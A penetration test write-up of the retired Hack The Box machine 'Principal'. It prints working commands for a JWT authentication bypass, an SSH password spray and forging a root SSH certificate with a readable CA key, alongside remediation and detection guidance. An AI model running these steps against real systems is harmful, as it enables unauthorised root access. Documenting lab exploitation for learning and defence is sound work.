# Penetration Test Report: Principal (HTB)

## Document Control

| Field | Detail |
|-------|--------|
| Report title | Penetration Test Report: Principal (HackTheBox) |
| Template version | v4 |
| Report version | 1.0 |
| Author | David Lumsden (M3ridi4n) |
| Reviewer (QA) | Self-reviewed |
| Date | 2026-08-23 |
| Classification | Confidential / Training Documentation |
| Distribution | Portfolio (public GitHub, retired machine only) |
| Redaction policy | Flags withheld. HTB IPs obfuscated as 10.129.XX.XX. Discovered credentials, hashes, private keys, and tokens redacted in body and evidence. |

### Version history

| Report version | Date | Author | Notes |
|----------------|------|--------|-------|
| 0.1 | 2026-08-23 | D. Lumsden | Initial draft from engagement notes |
| 1.0 | 2026-08-23 | D. Lumsden | Final, built to v4 template |

---

## Table of Contents

1. Executive Summary
2. Scope and Rules of Engagement
3. Methodology and Risk Rating Model
4. Attack Narrative
5. Findings Summary
6. Detailed Findings
7. Strategic Recommendations (Root-Cause Themes)
8. Remediation Roadmap
9. Proof of Exploitation
10. Retest and Validation
- Appendix A: Tools Used
- Appendix B: References

---

## 1. Executive Summary

An authorised black-box assessment was conducted against the Principal internal platform, a Linux-based web application accessible from the corporate network with no prior credentials. Within a single testing session, full administrative control of the web application was achieved by bypassing authentication entirely, and full operating-system control (root privileges on the underlying host) was subsequently obtained by abusing a misconfigured SSH certificate authority.

The two compromises are not independent defects. Both stem from the same architectural failure: the platform verifies that a cryptographic wrapper is well-formed and correctly signed or encrypted, but does not verify the identity claim contained inside that wrapper. This pattern is a systemic weakness in how the platform reasons about trust.

Overall risk rating: **CRITICAL**

### Findings at a glance

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High | 1 |
| Medium | 1 |
| Low | 0 |
| Informational | 1 |

Most urgent action: patch the authentication component (pac4j-jwt) to a version that rejects unsigned inner tokens, and restrict SSH certificate authentication with an explicit AuthorizedPrincipalsFile.

---

## 2. Scope and Rules of Engagement

| Item | Detail |
|------|--------|
| In scope | 10.129.XX.XX (single host, TCP/22 and TCP/8080) |
| Out of scope | Denial-of-service testing, destructive actions, lateral movement beyond the target host |
| Authorisation | Hack The Box platform terms of service; authorised training environment |
| Testing type | Black-box (no prior credentials or documentation) |
| Testing window | 2026-08-23 |
| Constraints | Single-session engagement; VPN-tethered access via HTB lab network |

---

## 3. Methodology and Risk Rating Model

Testing was aligned to PTES and NIST SP 800-115, structured across the following phases: reconnaissance, enumeration, vulnerability identification, exploitation, post-exploitation, and reporting.

Risk rating model: each finding is assigned a base severity using CVSS v3.1 (vector string shown per finding). Severity labels follow CVSS bands strictly: Critical 9.0 to 10.0, High 7.0 to 8.9, Medium 4.0 to 6.9, Low 0.1 to 3.9. A contextual Risk rating is then derived from Likelihood multiplied by Business Impact, reflecting how the finding would affect the assessed organisation rather than a generic environment. Where a CVE is cited, the CVSS vector is verified against the NVD entry; where no CVE applies, the vector is derived by the author and marked as such.

---

## 4. Attack Narrative

### Phase 1: Reconnaissance

Initial port and service discovery was conducted with RustScan piped into Nmap for version detection.

```bash
rustscan -a 10.129.XX.XX --ulimit 5000 -- -sC -sV -oN rustscan.txt
```

Two ports were exposed:

```
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy Jetty
|_http-title: Principal Internal Platform - Login
```

Reference: Figure 1.

The HTTP response on port 8080 included a header disclosing the authentication library and its pinned version:

```
X-Powered-By: pac4j-jwt/6.0.3
```

A named authentication library with a pinned version is a direct pointer to CVE research. This became the primary lead.

### Phase 2: Enumeration

The application redirected to `/login`, presenting a login form for the "Principal Internal Platform". The page referenced `/static/js/app.js`, which contained heavily commented client-side authentication logic.

```bash
curl -s http://10.129.XX.XX:8080/static/js/app.js
```

The comments and code exposed the full token model:

- Credentials post to `/api/auth/login`; the server returns a JWE-encrypted JWT.
- Token format: JWE using RSA-OAEP-256 and A128GCM; inner JWT signed with RS256.
- Public encryption key exposed at `/api/auth/jwks`.
- Admin-relevant endpoints: `/api/dashboard`, `/api/users`, `/api/settings`.
- Roles: `ROLE_ADMIN`, `ROLE_MANAGER`, `ROLE_USER`.

Retrieving the JWKS confirmed the encryption scheme and the key ID:

```bash
curl -s http://10.129.XX.XX:8080/api/auth/jwks | jq
```

```json
{ "keys": [{ "kty": "RSA", "e": "AQAB", "kid": "enc-key-1", "n": "[REDACTED]" }] }
```

Reference: Figure 2.

The combination of pac4j-jwt 6.0.3, JWE decryption, and JWS verification mapped directly to CVE-2026-29000.

### Phase 3: Initial Access

CVE-2026-29000 was exploited to bypass authentication (see finding F-01). A Python PoC fetched the JWKS, crafted a PlainJWT asserting `role: ROLE_ADMIN`, wrapped it in a valid JWE, and sent it to `/api/dashboard`.

```bash
python3 exploit.py http://10.129.XX.XX:8080
```

```
[*] Fetching JWKS...
[+] Public key retrieved (kid: enc-key-1)
[+] Forged token: [REDACTED]
[*] /api/dashboard -> HTTP 200
```

Reference: Figure 3.

HTTP 200 on an authenticated endpoint with a forged, unsigned inner token confirmed the bypass.

### Phase 4: Privilege Escalation / Lateral Movement

With admin access, protected endpoints were enumerated:

```bash
export TOKEN="[REDACTED]"
curl -s -H "Authorization: Bearer $TOKEN" http://10.129.XX.XX:8080/api/users | jq
curl -s -H "Authorization: Bearer $TOKEN" http://10.129.XX.XX:8080/api/settings | jq
```

`/api/users` returned eight accounts, including `svc-deploy`, annotated as the automated-deployment service account using SSH certificate authentication.

`/api/settings` disclosed an infrastructure configuration block containing a value labelled `encryptionKey` (redacted), the SSH CA path `/opt/principal/ssh/`, and a flag indicating SSH certificate authentication was enabled.

Reference: Figure 4.

The exposed `encryptionKey` was sprayed as a candidate SSH password against the harvested user list using NetExec:

```bash
nxc ssh 10.129.XX.XX -u ssh-users.txt -p '[REDACTED]'
```

A single account authenticated: `svc-deploy`. Interactive SSH login succeeded, yielding a shell as `svc-deploy` and access to the user flag.

Reference: Figure 5.

### Phase 5: Full Compromise

Group enumeration on the `svc-deploy` account revealed membership of the non-standard `deployers` group:

```bash
id
# uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

Files owned by the `deployers` group were enumerated in the SSH CA directory:

```bash
ls -la /opt/principal/ssh/
-rw-r-----  1 root deployers  288  README.txt
-rw-r-----  1 root deployers 3381  ca
-rw-r--r--  1 root root       742  ca.pub
```

The SSH CA private key `ca` was group-readable by `deployers` (see finding F-02). Review of the sshd drop-in configuration confirmed the exploitation path:

```bash
cat /etc/ssh/sshd_config.d/60-principal.conf
```

```
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

`TrustedUserCAKeys` was set, but `AuthorizedPrincipalsFile` was not. Without a principals file (or an equivalent command), OpenSSH accepts whichever principal appears inside a CA-signed certificate. Because `PermitRootLogin prohibit-password` still permits key-based (and by extension, certificate-based) root login, forging a certificate for the `root` principal was sufficient to obtain a root shell:

```bash
ssh-keygen -t ed25519 -f /tmp/pwn -N ""
ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub
ssh -i /tmp/pwn root@localhost
# uid=0(root) gid=0(root) groups=0(root)
```

Reference: Figure 6.

Root flag retrieved from `/root/root.txt`.

---

## 5. Findings Summary

| ID | Finding | Severity | CVSS | Risk | CVE |
|----|---------|----------|------|------|-----|
| F-01 | Authentication bypass via unsigned inner JWT (pac4j-jwt) | Critical | 9.8 | Critical | CVE-2026-29000 |
| F-02 | SSH CA trusted without principal restriction; CA private key readable by service group | High | 8.8 | High | n/a |
| F-03 | Secret exposed via authenticated API and reused as SSH password | Medium | 6.5 | High | n/a |
| F-04 | Framework and version disclosure via HTTP response header | Informational | 0.0 | Low | n/a |

---

## 6. Detailed Findings

### F-01: Authentication bypass via unsigned inner JWT (pac4j-jwt 6.0.3)

| Field | Detail |
|-------|--------|
| Severity | Critical |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 (NVD verification pending publication) |
| Likelihood | High |
| Business impact | High |
| Risk | Critical |
| CVE | CVE-2026-29000 |
| Affected asset | Principal Internal Platform, `/api/*` (10.129.XX.XX:8080) |
| Authentication required | None |
| MITRE ATT&CK | T1190 (Exploit Public-Facing Application); T1550.001 (Application Access Token) |

**Description:** pac4j-jwt 6.0.3's `JwtAuthenticator`, when configured with both JWE decryption and JWS signature verification, decrypts the outer JWE envelope and then calls `toSignedJWT()` on the inner payload to extract a signed token object. When the inner payload is a `PlainJWT` (unsigned, header `{"alg":"none"}`), `toSignedJWT()` returns `null`. The subsequent code performs an `if (signedJWT != null)` guard before verifying the signature, so a `null` result silently skips signature verification and the unsigned claims are trusted. Any attacker who can encrypt a JWE to the server's public key (which is exposed at the JWKS endpoint) can therefore assert arbitrary identity and role claims.

**Evidence:** the PoC below fetches the public key, crafts a PlainJWT with `role: ROLE_ADMIN`, wraps it in a valid JWE, and receives HTTP 200 from a protected endpoint (Figures 2 and 3). Full PoC preserved separately in the portfolio repository.

```
[*] Fetching JWKS...
[+] Public key retrieved (kid: enc-key-1)
[+] Forged token: [REDACTED]
[*] /api/dashboard -> HTTP 200
```

**Business impact:** an unauthenticated attacker on the network can assume any identity within the application, including administrative roles. All application data, user records, and configuration exposed through `/api/*` become readable and writable. For a real deployment this represents complete loss of confidentiality and integrity of the platform.

**Remediation:**
- Upgrade pac4j-jwt to a fixed version that explicitly rejects `PlainJWT` payloads inside JWE tokens.
- As an interim mitigation, wrap `JwtAuthenticator` in a validator that rejects any inner token whose header declares `"alg": "none"`.
- Do not expose the encryption public key at an unauthenticated endpoint unless strictly required.

**Detection guidance (SOC perspective):**
- Alert on successful authentication or authorised API calls immediately preceded by a request to `/api/auth/jwks` from the same source IP within a short window (for example, 60 seconds); legitimate clients rarely fetch the JWKS and then immediately authenticate for the first time from the same host.
- Log the inner JWT header algorithm at the authentication layer and alert on any value other than the expected signing algorithm (RS256).
- Baseline the set of source IPs that legitimately fetch `/api/auth/jwks`; alert on new sources.

**References:** CVE-2026-29000 (NVD entry, verification pending); pac4j project security advisories; RFC 7519 (JSON Web Token), Section 6 (Unsecured JWTs).

---

### F-02: SSH CA trusted without principal restriction; CA private key readable by service group

| Field | Detail |
|-------|--------|
| Severity | High |
| CVSS v3.1 | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = 7.8 (author-derived, no CVE) |
| Likelihood | High |
| Business impact | High |
| Risk | High |
| CVE | n/a |
| Affected asset | sshd on 10.129.XX.XX; `/etc/ssh/sshd_config.d/60-principal.conf`; `/opt/principal/ssh/ca` |
| Authentication required | User (local shell as any member of the `deployers` group) |
| MITRE ATT&CK | T1552.004 (Unsecured Credentials: Private Keys); T1098.004 (Account Manipulation: SSH Authorized Keys, related class); T1078.003 (Valid Accounts: Local Accounts) |

**Description:** The sshd configuration on the host sets `TrustedUserCAKeys` to `/opt/principal/ssh/ca.pub`, causing sshd to accept any user certificate signed by that CA. No `AuthorizedPrincipalsFile` or `AuthorizedPrincipalsCommand` directive is present, so sshd does not restrict which principals (usernames) the CA is authorised to issue certificates for. Compounding this, the CA private key `/opt/principal/ssh/ca` is group-readable by the `deployers` group, of which the low-privileged `svc-deploy` service account is a member. Any member of `deployers` can therefore sign a certificate for any principal, including `root`, and use it to obtain a root shell. `PermitRootLogin prohibit-password` explicitly permits key-based root login and does not mitigate this.

**Evidence:** file permissions on the CA key show `-rw-r----- root deployers`; sshd drop-in configuration confirms `TrustedUserCAKeys` is set and no principals file is configured. A certificate signed for the `root` principal produced a root shell in a single attempt (Figure 6).

**Business impact:** any user account with membership of the `deployers` group can obtain root privileges on the host. In a production context this collapses the trust boundary between the deployment service tier and the operating system, and any compromise of a deployer-tier account (for example, via reused credentials, as in F-03) escalates immediately to complete host compromise.

**Remediation:**
- Configure `AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u` in sshd, and populate one file per legitimate account listing only the principals that account is permitted to become. Never include `root`.
- Alternatively, use `AuthorizedPrincipalsCommand` with a script that validates principals dynamically against an authoritative source.
- Move the CA private key off the host. A CA signing key must not be readable by a service account. Store it on a hardware security module or a dedicated signing service that exposes only a sign operation, gated by strong authentication and audit logging.
- Set `PermitRootLogin no` unless certificate-based root access is a hard operational requirement, and if it is, restrict it to a named break-glass principal issued only by an offline CA.

**Detection guidance (SOC perspective):**
- Enable sshd verbose logging (`LogLevel VERBOSE`) and alert on any certificate authentication whose principal is `root` or any other privileged account.
- Baseline the certificate IDs (the `-I` field) legitimately issued by the CA; alert on unknown IDs.
- File integrity monitoring on `/opt/principal/ssh/` and on the sshd configuration; any read of the CA private key by a non-root process should generate an alert.
- Correlate certificate-authenticated sessions with the account that read the CA key on the same host within the preceding minutes.

**References:** `sshd_config(5)`, directives `TrustedUserCAKeys`, `AuthorizedPrincipalsFile`, `AuthorizedPrincipalsCommand`; OpenSSH PROTOCOL.certkeys; NIST SP 800-53 controls IA-5, AC-6.

---

### F-03: Secret exposed via authenticated API and reused as SSH password

| Field | Detail |
|-------|--------|
| Severity | Medium |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:N` = 6.5 (author-derived, no CVE) |
| Likelihood | Medium |
| Business impact | High |
| Risk | High |
| CVE | n/a |
| Affected asset | `/api/settings` endpoint on 10.129.XX.XX:8080 |
| Authentication required | Admin (application role) |
| MITRE ATT&CK | T1552.001 (Unsecured Credentials: Credentials In Files); T1078 (Valid Accounts) |

**Description:** The `/api/settings` endpoint returns an infrastructure configuration block including a value labelled `encryptionKey`. The value is a human-memorable string, not a random cryptographic key, and it was accepted as the SSH login password for the `svc-deploy` account. The same secret therefore functioned as both an application configuration value and an operating-system credential, spanning two trust boundaries.

**Evidence:** the value was extracted from the API response (redacted in this report), fed into NetExec as a password spray candidate against a user list also harvested from `/api/users`, and produced a successful SSH authentication for `svc-deploy` on the first attempt (Figure 5).

**Business impact:** in this engagement F-03 was the pivot that converted an application-layer compromise (F-01) into a host-layer foothold, which in turn enabled F-02. The contextual risk is therefore elevated to High even though the base CVSS is Medium.

**Remediation:**
- Do not return secrets of any kind through application APIs. Configuration values that are secret should be resolved server-side and never serialised to a client.
- Store secrets in a dedicated secrets manager (HashiCorp Vault, AWS Secrets Manager, or equivalent) and issue ephemeral, scope-limited credentials to applications.
- Enforce a policy that prohibits reuse of secrets across trust boundaries (application, database, operating system, cloud provider).
- Rotate the disclosed secret and audit all systems where it may have been reused.

**Detection guidance (SOC perspective):**
- Data-loss-prevention (DLP) inspection of outbound API responses for high-entropy strings, credential patterns, or field names matching a secret-name deny-list.
- Alert on `/api/settings` (or equivalent configuration endpoints) being fetched by any account, given how rarely legitimate clients need this data.

**References:** OWASP ASVS v4, section 6 (Stored Cryptography) and section 8 (Data Protection); NIST SP 800-63B.

---

### F-04: Framework and version disclosure via HTTP response header

| Field | Detail |
|-------|--------|
| Severity | Informational |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N` = 0.0 (author-derived, no CVE) |
| Likelihood | High |
| Business impact | Low |
| Risk | Low |
| CVE | n/a |
| Affected asset | HTTP responses from 10.129.XX.XX:8080 |
| Authentication required | None |
| MITRE ATT&CK | T1592.004 (Gather Victim Host Information: Client Configurations) |

**Description:** The application returns the header `X-Powered-By: pac4j-jwt/6.0.3` on HTTP responses. This discloses both the authentication library in use and its exact version, allowing an attacker to move directly to CVE research without any active fingerprinting.

**Evidence:** header observed in the response to an unauthenticated GET request to the login page.

**Business impact:** informational on its own; in this engagement the disclosure meaningfully shortened the reconnaissance phase leading to F-01.

**Remediation:**
- Remove `X-Powered-By` and equivalent framework banner headers at the reverse proxy or application server layer.
- Include a periodic review of exposed response headers in the application's security baseline.

**Detection guidance (SOC perspective):** low value in isolation; combine with rate-based detection on `/api/auth/*` and JWKS access to surface reconnaissance patterns.

**References:** OWASP Secure Headers Project.

---

## 7. Strategic Recommendations (Root-Cause Themes)

**Theme 1: Cryptographic verification is not identity verification.** Both the foothold and the privilege escalation exploit the same reasoning error: the platform confirms that a cryptographic wrapper (a JWE envelope, a signed SSH certificate) is well-formed and comes from an expected party, but does not confirm that the identity claim inside that wrapper is one the system should accept. Strategic recommendation: introduce a review standard requiring that every authentication or authorisation decision explicitly enumerates both the cryptographic checks and the identity-claim checks it performs, and that unit and integration tests cover the negative cases (unsigned tokens, unexpected principals, unknown issuers).

**Theme 2: Secrets are treated as configuration.** The `encryptionKey` returned by `/api/settings` and reused as an SSH password shows that secrets are being managed as ordinary application configuration values. Strategic recommendation: adopt a secrets-management standard (Vault or equivalent) with a hard policy that no secret is retrievable through an application API, and that secrets are never reused across trust boundaries.

**Theme 3: Service accounts hold operator-class privileges.** The `svc-deploy` service account holds group-level read access to a certificate-authority private key. Strategic recommendation: enforce a least-privilege baseline for service accounts, remove any capability that would permit escalation to root or issuance of new credentials, and move CA signing operations to a dedicated signing service or HSM that exposes only a bounded sign operation.

---

## 8. Remediation Roadmap

### Immediate (Critical priority)
- Upgrade pac4j-jwt to a version that rejects unsigned inner tokens (F-01).
- Configure `AuthorizedPrincipalsFile` in sshd and remove group read on the CA private key (F-02).
- Rotate the secret disclosed at `/api/settings` and remove secrets from API responses (F-03).

### Short-term (High priority)
- Move the SSH CA signing key off the application host to an HSM or dedicated signing service.
- Remove `X-Powered-By` and other framework disclosure headers (F-04).
- Deploy the SOC detections described per finding.

### Medium-term
- Establish the review standard, secrets-management standard, and least-privilege baseline described in Section 7.
- Add negative-case authentication tests to the CI pipeline, covering unsigned tokens, unexpected algorithms, and unauthorised principals.

---

## 9. Proof of Exploitation

| Flag | Method | Location |
|------|--------|----------|
| User | JWE-wrapped unsigned JWT bypass to admin API, credential harvest from `/api/settings`, SSH password reuse to `svc-deploy` | `/home/svc-deploy/user.txt` -> [REDACTED] |
| Root | Read of group-readable SSH CA private key, forged user certificate for `root` principal, SSH login as root | `/root/root.txt` -> [REDACTED] |

---

## 10. Retest and Validation

A retest is recommended once the Immediate remediation items are complete. The retest should specifically verify: that a JWE containing an unsigned inner token is rejected with an authentication failure and logged; that a CA-signed certificate for a principal not listed in `AuthorizedPrincipalsFile` is rejected by sshd; that the CA private key is no longer accessible from the application host; and that no secret values are returned by `/api/settings` or equivalent endpoints. Recommended retest window: within 14 days of remediation completion.

---

## Appendix A: Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| RustScan | 2.x | Fast TCP port sweep |
| Nmap | 7.9x | Service and version detection |
| curl | 8.x | HTTP interaction with API endpoints |
| jq | 1.7 | JSON parsing of API responses |
| Python 3 + jwcrypto + requests | 3.12 / current | JWE token forgery PoC |
| NetExec (nxc) | current | SSH password spray |
| OpenSSH `ssh-keygen`, `ssh` | 9.6 | Keypair generation, CA signing, session |

## Appendix B: References

| Reference | URL |
|-----------|-----|
| CVE-2026-29000 (pac4j-jwt authentication bypass) | https://nvd.nist.gov/vuln/detail/CVE-2026-29000 |
| RFC 7519 (JSON Web Token), Section 6 (Unsecured JWTs) | https://datatracker.ietf.org/doc/html/rfc7519#section-6 |
| OpenSSH `sshd_config(5)` | https://man.openbsd.org/sshd_config |
| OpenSSH PROTOCOL.certkeys | https://github.com/openssh/openssh-portable/blob/master/PROTOCOL.certkeys |
| OWASP Secure Headers Project | https://owasp.org/www-project-secure-headers/ |
| OWASP ASVS v4 | https://owasp.org/www-project-application-security-verification-standard/ |
| MITRE ATT&CK Enterprise | https://attack.mitre.org/matrices/enterprise/ |

---

*Produced for educational purposes within an authorised training environment. All testing was conducted legally on assigned infrastructure.*
